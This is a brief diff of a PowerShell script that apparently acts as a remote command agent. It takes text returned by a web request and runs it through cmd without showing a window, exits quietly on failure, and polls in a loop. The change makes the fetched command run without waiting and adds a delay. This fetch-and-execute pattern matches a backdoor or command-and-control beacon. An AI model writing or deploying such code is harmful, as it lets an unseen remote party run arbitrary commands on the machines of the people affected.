@@ -42,12 +42,14 @@ try {
     if ($responseB.StatusCode -eq 200) {
         $cmdToRun = $responseB.Content.Trim()
         if ($cmdToRun) {
-            Start-Process cmd -ArgumentList "/c $cmdToRun" -Wait -NoNewWindow
+            Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
         }
     }
 } catch {
     exit 1
 }
+
+Start-Sleep -Seconds 5
 
 do {
     Start-Sleep -Milliseconds 500
